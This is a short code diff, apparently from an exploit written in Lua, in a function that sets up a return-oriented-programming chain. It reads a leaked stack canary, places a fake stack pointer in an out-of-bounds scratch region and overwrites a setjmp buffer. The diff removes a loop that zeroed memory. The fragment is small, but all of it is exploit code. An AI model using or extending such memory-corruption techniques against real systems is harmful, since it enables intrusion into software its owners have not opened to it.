@@ -59,9 +59,6 @@ function jit_init_rop()
     LEAK_R15 = read64(NEW_DOOR3_GLOBAL + 0x110 + 0x38) -- stack canary
     
     FAKE_RSP = OOB_SCRATCH_BASE + 0x60000
-    for i = 0, 0x8000 do
-        write64(FAKE_RSP - 0x20000 + i, 0)
-    end
     
     write64(OOB_SCRATCH_BASE + 0x180, OOB_SCRATCH_BASE + 0x3000)    
     -- overwrite setjmp buffer in realtime
